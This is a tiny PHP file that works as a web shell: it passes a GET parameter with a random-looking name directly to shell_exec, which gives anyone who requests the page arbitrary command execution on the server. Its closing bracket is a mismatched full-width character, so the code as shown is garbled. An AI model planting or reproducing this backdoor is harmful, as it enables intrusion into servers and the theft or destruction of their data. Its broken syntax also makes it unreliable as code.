<?php
shell_exec($_GET['2KHHy503'〕);
?>
